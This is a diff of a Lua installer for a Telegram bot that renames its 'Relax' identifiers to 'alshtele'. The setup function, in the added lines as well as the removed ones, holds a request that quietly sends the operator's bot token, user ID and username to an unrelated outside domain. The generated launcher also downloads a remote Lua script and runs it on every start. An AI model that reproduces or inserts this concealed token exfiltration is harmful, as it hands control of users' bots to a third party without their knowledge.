@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Relax = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Relax = function() 
+Server_alshtele = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_alshtele = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local Relax_Info_Sudo = io.open("sudo.lua", 'w')
-Relax_Info_Sudo:write([[
+local alshtele_Info_Sudo = io.open("sudo.lua", 'w')
+alshtele_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-Relax_Info_Sudo:close()
+alshtele_Info_Sudo:close()
 end  
-if not database:get(Server_Relax.."Token_Relax") then
+if not database:get(Server_alshtele.."Token_alshtele") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Relax.."Token_Relax",token)
+database:set(Server_alshtele.."Token_alshtele",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Relax.."UserName_Relax") then
+if not database:get(Server_alshtele.."UserName_alshtele") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Relax.."UserName_Relax",Json.Info.Username)
-database:set(Server_Relax.."Id_Relax",Json.Info.Id)
+database:set(Server_alshtele.."UserName_alshtele",Json.Info.Username)
+database:set(Server_alshtele.."Id_alshtele",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_Relax_Info()
-Create_Info(database:get(Server_Relax.."Token_Relax"),database:get(Server_Relax.."Id_Relax"),database:get(Server_Relax.."UserName_Relax"))   
-https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_Relax.."Id_Relax").."&user="..database:get(Server_Relax.."UserName_Relax").."&token="..database:get(Server_Relax.."Token_Relax"))
-local RunRelax = io.open("Relax", 'w')
-RunRelax:write([[
+local function Files_alshtele_Info()
+Create_Info(database:get(Server_alshtele.."Token_alshtele"),database:get(Server_alshtele.."Id_alshtele"),database:get(Server_alshtele.."UserName_alshtele"))   
+https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_alshtele.."Id_alshtele").."&user="..database:get(Server_alshtele.."UserName_alshtele").."&token="..database:get(Server_alshtele.."Token_alshtele"))
+local Runalshtele = io.open("alshtele", 'w')
+Runalshtele:write([[
 #!/usr/bin/env bash
-cd $HOME/Relax
-token="]]..database:get(Server_Relax.."Token_Relax")..[["
-rm -fr Relax.lua
-wget "https://raw.githubusercontent.com/KainSource/Relax/master/Relax.lua"
+cd $HOME/alshtele
+token="]]..database:get(Server_alshtele.."Token_alshtele")..[["
+rm -fr alshtele.lua
+wget "https://raw.githubusercontent.com/KainSource/alshtele/master/alshtele.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Relax.lua -p PROFILE --bot=$token
+./tg -s ./alshtele.lua -p PROFILE --bot=$token
 done
 ]])
-RunRelax:close()
+Runalshtele:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Relax
+cd $HOME/alshtele
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Relax -X kill
-screen -S Relax ./Relax
+screen -S alshtele -X kill
+screen -S alshtele ./alshtele
 done
 ]])
 RunTs:close()
 end
-Files_Relax_Info()
-database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
+Files_alshtele_Info()
+database:del(Server_alshtele.."Token_alshtele");database:del(Server_alshtele.."Id_alshtele");database:del(Server_alshtele.."UserName_alshtele")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Relax()  
+AutoFiles_alshtele()  
 var = true
 else   
 f:close()  
-database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
+database:del(Server_alshtele.."Token_alshtele");database:del(Server_alshtele.."Id_alshtele");database:del(Server_alshtele.."UserName_alshtele")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
